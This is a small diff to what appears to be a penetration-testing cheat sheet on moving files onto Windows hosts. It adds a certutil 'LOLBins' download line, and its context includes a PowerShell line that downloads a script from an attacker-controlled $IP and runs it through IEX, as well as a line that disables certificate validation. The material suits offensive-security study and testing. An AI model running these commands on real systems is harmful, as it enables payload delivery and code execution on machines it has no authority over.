@@ -54,6 +54,13 @@ Invoke-WebRequest http://$IP/test.ps1 -UseBasicParsing | IEX
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 ```
 
+### LOLBins download
+
+```bash
+# Download into disk (https://lolbas-project.github.io/lolbas/Binaries/Certutil/)
+certutil.exe -urlcache -f http://$IP/test.txt test.txt
+```
+
 ### SMB download
 
 ```bash
